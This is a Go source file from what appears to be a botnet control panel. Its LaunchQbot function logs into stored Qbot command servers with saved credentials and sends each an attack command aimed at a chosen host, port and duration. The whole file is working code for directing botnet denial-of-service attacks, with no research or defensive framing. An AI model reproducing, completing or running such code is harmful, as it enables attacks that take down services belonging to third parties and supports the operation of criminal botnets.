package attacks

import (
	"fmt"
	"net"
	"time"
	"webserver/src/config"
	"webserver/src/database"
)

func LaunchQbot(host string, port string, tm string, method string) error {
	qbots, err := database.FetchQbots()
	if err != nil {
		return err
	}
	if qbots == nil {
		return err
	}

	for _, qbot := range qbots {
		dialer := &net.Dialer{
			Timeout: 2 * time.Second,
		}
		conn, err := dialer.Dial("tcp4", fmt.Sprintf("%s:%d", qbot.Host, qbot.Port))
		if err != nil {
			fmt.Printf("(qbot) Failed To Connect To %s:%d\r\n", qbot.Host, qbot.Port)
			return err
		}
		conn.Write([]byte(qbot.Username + "\r\n"))
		conn.Write([]byte(qbot.Password + "\r\n"))

		
		for _, v := range config.Cfg.QbotMethods {
			if method == v.Name {
				cmd := BuildCommand(v.Command, host, port, tm)
				fmt.Printf("(qbot) Sent Command To ID: %d | cmd: %s\r\n", qbot.Id, cmd)
				go conn.Write([]byte(cmd))
			}
		}
	}
	return nil
}
